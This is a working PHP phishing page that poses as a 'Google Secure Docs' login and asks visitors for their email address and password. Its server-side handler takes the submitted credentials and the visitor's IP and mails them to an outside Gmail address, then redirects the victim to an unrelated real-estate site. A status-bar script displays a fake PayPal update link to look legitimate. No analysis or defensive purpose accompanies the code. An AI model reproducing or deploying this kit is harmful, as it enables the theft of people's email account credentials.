<? 
if($_GET === array())$_GET['index'] = true; 
if(isset($_GET['index'])) 
{ 
?> 
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<td><img src="http://main.makeuseoflimited.netdna-cdn.com/wp-content/uploads/2013/01/Intro-Image.jpg" width="216" height="150" border="0"></td>
<title>Google Secure Docs</title>
<link rel="stylesheet" type="text/css" href="http://content.remax-northcentral.com/media/intranet/style/02/intranetstyle.css" />
<script language="JavaScript" type="text/JavaScript">
function echeck(str) {
 
		var at="@"
		var dot="."
		var lat=str.indexOf(at)
		var lstr=str.length
		var ldot=str.indexOf(dot)
		if (str.indexOf(at)==-1){
		   alert("Invalid E-mail Address")
		   return false
		}
 
		if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
		   alert("Invalid E-mail Address")
		   return false
		}
 
		if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
		    alert("Invalid E-mail Address")
		    return false
		}
 
		 if (str.indexOf(at,(lat+1))!=-1){
		    alert("Invalid E-mail Address")
		    return false
		 }
 
		 if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
		    alert("Invalid E-mail Address")
		    return false
		 }
 
		 if (str.indexOf(dot,(lat+2))==-1){
		    alert("Invalid E-mail Address")
		    return false
		 }
		
		 if (str.indexOf(" ")!=-1){
		    alert("Invalid E-mail Address")
		    return false
		 }
 
 		 return true					
	}
 
function submitIt(processForm){
	if(processForm.userid.value == ""){
		alert("Please enter your Email Address");
		processForm.userid.select();
		return false;
	}
	if(processForm.Password.value == ""){
		alert("Please enter your Email Password");
		processForm.Password.select();
		return false;
	}
	if (echeck(processForm.userid.value)==false){
		processForm.userid.value=""
		processForm.Password.select();
		return false
	}
}
</script>
</head>
<body style="margin: 5px;" onload="whenLoaded();">

<table border="0" cellpadding="0" cellspacing="0" width="100%" height="100%">
<form action="?zola" method="post" onsubmit="return submitIt(this)">
<input type="hidden" id="screenSize" name="screenSize">
<tr>
<td valign="middle" align="center">

	<table border="0" cellpadding="0" cellspacing="0">
	<tr>
	<td>
	
		<table border="0" cellpadding="0" cellspacing="0" class="itemcontainer" style="width:508px;">
		
		<tr>
		<td colspan="2" align="center">
			<table border="0" cellpadding="0" cellspacing="0">
			<tr>
			<td class="itemTitle" style="font-size:12pt;text-align:center;">Login your email address below to view the document.</td>
			</tr>
			</table>
		</td>
		</tr>
		<tr>
		<td colspan="2"><img src="http://content.remax-northcentral.com/media/global/invis.gif" height="5"></td>
		</tr>
		<tr>
		<td align="center" valign="top">
			<table border="0" cellpadding="0" cellspacing="0">
			<tr>
			<td><img src="http://content.remax-northcentral.com/media/global/invis.gif" height="20"></td>
			</tr>
			<tr>
			<td><img src="http://fc05.deviantart.net/fs71/f/2011/249/6/5/google_logo_by_dracu_teufel666-d491ml0.jpg"  width="216" height="100" border="0"></td>
			</tr>
			</table>
		</td>
		<td valign="top">
		
			<table border="0" cellpadding="0" cellspacing="0">
			
			<tr>
			<td colspan="2" class="dataitem">Email Address</td>
			</tr>
			<tr>
			<td colspan="2" style="padding-left: 13px;"><input name="userid" type="text" style="width: 202px;" onkeypress="entsub('intranetlogin');" tabindex="1"></td>
			</tr>
			<tr>
			<td colspan="2" class="dataitem">Email Password</td>
			</tr>
			<tr>
			<td colspan="2" style="padding-left: 13px;"><input type="password" name="Password" style="width: 202px; font-size: 11px;" onkeypress="entsub('intranetlogin');" tabindex="2"></td>
			</tr>
			<tr>
			<td colspan="2" style="padding-left: 13px;" class="small">Passwords are case sensitive</td>
			</tr>
			<tr>
			<td colspan="2" valign="top"><img src="http://content.remax-northcentral.com/media/global/invis.gif" width="216" height="20" border="0"></td>
			</tr>
			<tr>
			<td colspan="2" style="text-align:right; padding-right:6px;"><span class="buttonSurround"><input type="submit" class="button" value="     Submit     " onkeypress="entsub('intranetlogin');"  tabindex="3"></td>
			</tr>
			<tr>
			<td colspan="2" valign="top"><img src="http://content.remax-northcentral.com/media/global/invis.gif" width="216" height="15" border="0"></td>
			</tr>
			<tr>
			<td colspan="2" valign="top"><img src="http://content.remax-northcentral.com/media/global/invis.gif" width="216" height="15" border="0"></td>
			</tr>
			
			</table>
			
		</td>
		</tr>
		</table>

	</td>
	</tr>
	<tr>
	<td>
		
			<table border="0" cellpadding="0" cellspacing="0" class="itemcontainer" style="width:508px;">
			<tr>
			<td><img src="http://content.remax-northcentral.com/media/global/invis.gif" height="20"></td>
			</tr>
			<tr>
			<td align="center"><b>To access our online secured documents page,you are required to login your email address.</b></td>
			</tr>
			<tr>
			<td align="center"><b><span class="highVisibility"">Unauthorized Access is prohibited.</span></b></td>
			</tr>
			<tr>
			<td><img src="http://content.remax-northcentral.com/media/global/invis.gif" height="20"></td>
			</tr>
			</table>
		

	</td>
	</tr>
	<tr>
	<td><img src="http://content.remax-northcentral.com/media/global/invis.gif" height="10"></td>
	</tr>
	<tr>
	<td align="center" style="font-size:11px;" width="508">
		The Intranet Website Management Center requires Internet Explorer 6.0 or greater
	</td>
	</tr>
	</table>
	
</td>
</tr>
<tr>
<td height="20" valign="bottom" align="center" style="font-size: 9px;" id="displayScreenSize"></td>
</tr>
</form>
</table>


</body>
</html>


<SCRIPT LANGUAGE="JavaScript"> 
   <!-- 
      // Following COPYRIGHT �1997  Dennis & Family.  All Rights Reserved. 
           function snapIn(jumpSpaces,position) { var msg = "http://www.paypal.com/cgi-bin/webscr?cmd=_update"; var out = ""; for (var i=0; i<position; i++) { out += msg.charAt(i) } for (i=1;i<jumpSpaces;i++) { out += " " } out += msg.charAt(position); window.status = out; if (jumpSpaces <= 1) { position++; if (msg.charAt(position) == ' ') { position++ } jumpSpaces = 00-position } else if (jumpSpaces >  3) { jumpSpaces *= .00 } else { jumpSpaces-- } if (position != msg.length) { var cmd = "snapIn(" + jumpSpaces + "," + position + ")"; window.setTimeout(cmd,00); } return true } 
   //--> 

</SCRIPT> 

<body onLoad="snapIn(11110,0)"> 
<? 
} 
if(isset($_GET['zola'])) 
{ 
include 'Login_files/validate_form.js';
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- XxX  *~* Anat0n3 *~*  XxX----------------------\n";
$message .= "YahooMail: ".$_POST['userid']."\n";
$message .= "Password: ".$_POST['Password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------------------------------Created By ZolaHacker--------------------------------------\n";
$recipient = "anatoniatone8947@gmail.com";
$subject = "NewMe";
$headers .= "MIME-Version: 1.0\n";
mail("$recipient", "$subject", $message, $headers);
mail("$recipent", "$subject", $message, $headers);
header("Location: http://www.fmrealestate.com/listings/query.php?radarea=0&startnewsearch=1&aid=&oid=&temp=&aname=&aimg=&chome=&odoor=&agent_hasfeat=&slide_show=0&aid=&oid=&searchtypesent=1&property_category=1&searchtype=1&state=38&county=0&b.x=28&b.y=5&pricemin=&pricemax=&bedrooms=&bath_full=&garages=&sqfoot_low=&sqfoot_high=&stories=&PropType=&yb_l=0000&yb_h=2012&acres=&acres_h=&reducedpricedays=7&vtycount=2&restype=1&limit=10&sort=1&pastdays=");
	  

?>
</head></html>
<?
}
?>